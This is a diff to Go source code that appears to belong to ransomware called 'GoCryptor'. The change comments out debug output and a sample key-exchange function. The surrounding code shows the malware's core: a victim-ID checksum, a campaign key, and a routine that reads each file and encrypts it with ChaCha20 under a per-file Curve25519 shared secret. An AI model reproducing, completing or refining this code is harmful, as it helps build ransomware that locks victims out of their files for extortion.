@@ -2,7 +2,6 @@ package main
 
 import (
 	"encoding/binary"
-	"fmt"
 	"hash/crc32"
 	"io/fs"
 	"math/rand"
@@ -50,23 +49,23 @@ func generateSharedSecret(myPrivateKey [32]byte, theirPublicKey [32]byte) []byte
 	return sharedSecret[:]
 }
 
-func curve25519Example() {
-	myPrivateKey := [32]byte{191, 145, 93, 226, 52, 69, 63, 94, 153, 130, 232, 193, 74, 144, 81, 137, 132, 134, 145, 160, 130, 210, 154, 23, 221, 139, 188, 40, 59, 38, 146, 143}
-	myPublicKey := generatePublicKey(myPrivateKey)
-	fmt.Println("My private key: ", myPrivateKey)
-	fmt.Println("My public key: ", myPublicKey)
+// func curve25519Example() {
+// 	myPrivateKey := [32]byte{191, 145, 93, 226, 52, 69, 63, 94, 153, 130, 232, 193, 74, 144, 81, 137, 132, 134, 145, 160, 130, 210, 154, 23, 221, 139, 188, 40, 59, 38, 146, 143}
+// 	myPublicKey := generatePublicKey(myPrivateKey)
+// 	fmt.Println("My private key: ", myPrivateKey)
+// 	fmt.Println("My public key: ", myPublicKey)
 
-	theirPrivateKey := [32]byte{63, 25, 33, 73, 88, 56, 26, 249, 232, 213, 30, 122, 35, 253, 225, 48, 148, 173, 229, 241, 29, 141, 170, 31, 37, 16, 158, 227, 75, 34, 153, 228}
-	theirPublicKey := generatePublicKey(theirPrivateKey)
-	fmt.Println("Their private key: ", theirPrivateKey)
-	fmt.Println("Their public key: ", theirPublicKey)
+// 	theirPrivateKey := [32]byte{63, 25, 33, 73, 88, 56, 26, 249, 232, 213, 30, 122, 35, 253, 225, 48, 148, 173, 229, 241, 29, 141, 170, 31, 37, 16, 158, 227, 75, 34, 153, 228}
+// 	theirPublicKey := generatePublicKey(theirPrivateKey)
+// 	fmt.Println("Their private key: ", theirPrivateKey)
+// 	fmt.Println("Their public key: ", theirPublicKey)
 
-	sharedSecret1 := generateSharedSecret(theirPrivateKey, myPublicKey)
-	sharedSecret2 := generateSharedSecret(myPrivateKey, theirPublicKey)
+// 	sharedSecret1 := generateSharedSecret(theirPrivateKey, myPublicKey)
+// 	sharedSecret2 := generateSharedSecret(myPrivateKey, theirPublicKey)
 
-	fmt.Println("Shared secret 1: ", sharedSecret1)
-	fmt.Println("Shared secret 2: ", sharedSecret2)
-}
+// 	fmt.Println("Shared secret 1: ", sharedSecret1)
+// 	fmt.Println("Shared secret 2: ", sharedSecret2)
+// }
 
 // CRC32 generating checksum for victim ID
 func crc32Checksum(input []byte, polynomial uint32) uint32 {
@@ -90,18 +89,18 @@ func encryptFileFull(filePath string, fileInfo fs.FileInfo) {
 	copy(filePrivateKey[:], generateRandomBuffer(32))
 	filePublicKey := generatePublicKey(filePrivateKey)
 
-	fmt.Println("!!!!!!!!!!!!", GoCryptorConfig.campaignKey)
+	// fmt.Println("!!!!!!!!!!!!", GoCryptorConfig.campaignKey)
 	sharedSecret := generateSharedSecret(filePrivateKey, GoCryptorConfig.campaignKey)
 
-	fmt.Println("Private key: ", filePrivateKey)
-	fmt.Println("Public key: ", filePublicKey, len(filePublicKey))
-	fmt.Println("Shared secret: ", sharedSecret, len(sharedSecret))
+	// fmt.Println("Private key: ", filePrivateKey)
+	// fmt.Println("Public key: ", filePublicKey, len(filePublicKey))
+	// fmt.Println("Shared secret: ", sharedSecret, len(sharedSecret))
 
 	fileNonce := generateRandomBuffer(24)
-	fmt.Println("Nonce: ", fileNonce, len(fileNonce))
+	// fmt.Println("Nonce: ", fileNonce, len(fileNonce))
 
 	fileBuffer, _ := os.ReadFile(filePath)
-	fmt.Println("Buffer: ", len(fileBuffer))
+	// fmt.Println("Buffer: ", len(fileBuffer))
 
 	encryptedFileBytes, _ := chacha20Encryptor(fileBuffer, sharedSecret, fileNonce) // TODO: Make this safer
 
